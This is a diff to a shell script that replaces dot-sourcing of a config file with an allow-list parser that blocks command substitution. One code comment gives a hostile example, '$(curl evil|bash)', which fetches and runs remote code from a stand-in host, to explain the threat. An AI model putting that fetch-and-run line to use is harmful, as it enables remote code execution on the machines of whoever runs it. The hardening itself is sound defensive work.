@@ -57,7 +57,42 @@ COOLDOWN_MAX_SECONDS=1800
 MAX_ITERATIONS=0
 NTFY_ON_COOLDOWN=1
 
-[ -f "$CONF" ] && . "$CONF"
+# Load autopilot.conf with an allow-listed parser instead of dot-sourcing.
+# Dot-sourcing makes this file an arbitrary-code vector; a PR landing a
+# committed autopilot.conf with `$(curl evil|bash)` would execute on every
+# autopilot start. Parser allows only `KEY=VALUE` and `KEY="VALUE"` for a
+# whitelist of variables. Anything else is rejected with a loud error.
+if [ -f "$CONF" ]; then
+  ALLOWED_KEYS="LAUNCHER_CMD PID_FILE LOG_FILE MAX_CONSECUTIVE_FAILURES COOLDOWN_BASE_SECONDS COOLDOWN_MAX_SECONDS MAX_ITERATIONS NTFY_ON_COOLDOWN"
+  while IFS= read -r line || [ -n "$line" ]; do
+    # Strip comments + whitespace
+    line="${line%%#*}"
+    line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+    [ -z "$line" ] && continue
+    case "$line" in
+      *=*) : ;;                         # looks like KEY=VALUE
+      *)   echo "autopilot.conf: unrecognized line '$line'" >&2; exit 2 ;;
+    esac
+    key="${line%%=*}"
+    val="${line#*=}"
+    # Allow-list the key
+    grep -qw "$key" <<<"$ALLOWED_KEYS" || {
+      echo "autopilot.conf: key '$key' not in allow-list" >&2; exit 2
+    }
+    # Reject command substitution / backticks in the value. Note that the
+    # value may be legitimately quoted ("nohup bash …").
+    case "$val" in
+      *'$('*|*'`'*) echo "autopilot.conf: value for '$key' contains \$(/\`; refusing (arbitrary-code vector)" >&2; exit 2 ;;
+    esac
+    # Strip matched surrounding quotes
+    case "$val" in
+      \"*\") val="${val#\"}"; val="${val%\"}" ;;
+      \'*\') val="${val#\'}"; val="${val%\'}" ;;
+    esac
+    # Assign — this is now a plain literal, not an eval.
+    printf -v "$key" '%s' "$val"
+  done < "$CONF"
+fi
 
 emit() {
   local kind="$1" msg="$2"
